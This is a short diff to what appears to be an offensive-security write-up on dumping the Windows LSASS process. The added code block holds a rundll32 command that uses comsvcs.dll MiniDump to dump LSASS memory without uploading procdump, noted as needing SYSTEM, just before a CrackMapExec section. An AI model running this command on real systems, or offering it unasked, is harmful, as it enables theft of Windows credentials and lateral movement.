@@ -405,6 +405,10 @@ Once these 3 arguments has been parsed, basically this DLL creates the dump file
 
 Thanks to this function, we can use **comsvcs.dll** to dump lsass process instead of uploading procdump and executing it.
 
+```
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump "<lsass pid> lsass.dmp full"
+```
+
 We just have to keep in mind that this technique can only be executed as **SYSTEM**.
 
 ## CrackMapExec module
